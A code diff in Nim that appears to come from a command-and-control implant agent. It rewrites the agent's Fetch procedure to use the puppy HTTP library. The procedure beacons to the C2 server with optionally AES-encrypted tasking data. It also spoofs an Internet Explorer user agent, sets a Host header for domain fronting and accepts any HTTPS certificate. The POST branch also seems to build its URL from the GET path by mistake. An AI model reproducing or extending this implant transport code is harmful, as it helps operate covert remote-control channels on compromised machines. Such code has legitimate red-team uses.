@@ -1,6 +1,7 @@
 import base64
 import asyncdispatch
-import httpclient
+#import httpclient
+import puppy
 import config
 from checkin import getHostName
 from task import Job
@@ -19,28 +20,41 @@ proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.asy
     var tempData = bdata
     let dataToSend = when defined(AESPSK): encryptStr(curConfig.PayloadUUID, curConfig.Psk, bdata) else: bdata
     var proxySet = false
-    var myProxy : Proxy
+    #var myProxy : Proxy
     when not defined(release):
         echo "Curconfig.ProxyAddress: ", curConfig.ProxyAddress
-    if(len(curConfig.ProxyAddress) > 1):
-        myProxy = newProxy(curConfig.ProxyAddress, curConfig.ProxyUser & ":" & curConfig.ProxyPassword)
-        proxySet = true
+    #if(len(curConfig.ProxyAddress) > 1):
+    #    myProxy = newProxy(curConfig.ProxyAddress, curConfig.ProxyUser & ":" & curConfig.ProxyPassword)
+    #    proxySet = true
+
+
     when not defined(release):
         echo "Creating client, is proxyset?  ", $(proxySet)
     # check if config.hostheader is set and if it is add httpheader check here
     
-    let client = if proxySet: newAsyncHttpClient( if len(curConfig.UserAgent) > 0: curConfig.UserAgent else: defUserAgent, proxy = myProxy) 
-                 else: newAsyncHttpClient(if len(curConfig.UserAgent) > 0: curConfig.UserAgent else: defUserAgent)
+    
+
+    when not defined(release):
+        echo "still need proxy fix!!!"
+    var headers: HttpHeaders
+    headers["UserAgent"] = if len(curConfig.UserAgent) > 0: curConfig.UserAgent else: "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
+
+
+
+
     when not defined(release):
         echo "Client has been created"
     
     if(curConfig.HostHeader != "domain_front"):
-        client.headers = newHttpHeaders({"Host": curConfig.HostHeader})
+        
+        headers["Host"] = curConfig.HostHeader
+        
     #var temp = curConfig
     #temp.Servers.sort(serverCmp)  
     # TODO SORT
     #curConfig.Servers.sort(serverCmp)
     #curConfig = temp
+    var req: Request
     try:
         if isGet:
             when not defined(release):
@@ -50,12 +64,22 @@ proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.asy
                 echo "get url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend})
                 echo "making request"
             
-            result = await getContent(client, $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend}))
+            #result = await getContent(client, $(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param: dataToSend}))
+            
+            req = Request(url : parseUrl($(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl ? {curConfig.Param : dataToSend})), verb : "get", headers : headers, allowAnyHttpsCertificate : true)
+            
+            let pupyresponse = fetch(req)
+            result = pupyresponse.body
         else:
             when not defined(release):
                 echo "post url: ", $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl), " data: ", dataToSend
                 echo "sending data: ", tempData
-            result = await postContent(client, $(parseUri(curConfig.Servers[0].Domain) / curConfig.PostUrl), dataToSend)
+
+            
+            
+            req = Request(url : parseUrl($(parseUri(curConfig.Servers[0].Domain) / curConfig.GetUrl)), verb : "post", headers : headers, body : dataToSend, allowAnyHttpsCertificate : true)
+            let pupyresponse = fetch(req)
+            result = pupyresponse.body
         when not defined(release):
             echo "Just received data back from get or post request: ", result
         when defined(AESPSK):
@@ -69,9 +93,7 @@ proc Fetch*(curConfig: Config, bdata: string, isGet: bool): Future[string] {.asy
         when not defined(release):
             echo "An exception has occurred when attempting to do a GET request: ", repr(e), " with message ", msg
         result = repr(e)
-    finally:
-        # Clean up connections
-        close(client)
+
 
 proc postUp*(curConfig: Config, results: seq[Job]): Future[tuple[postupResp: string, resSeq: seq[Job]]] {.async.} =
     var newJobSeq: seq[Job]
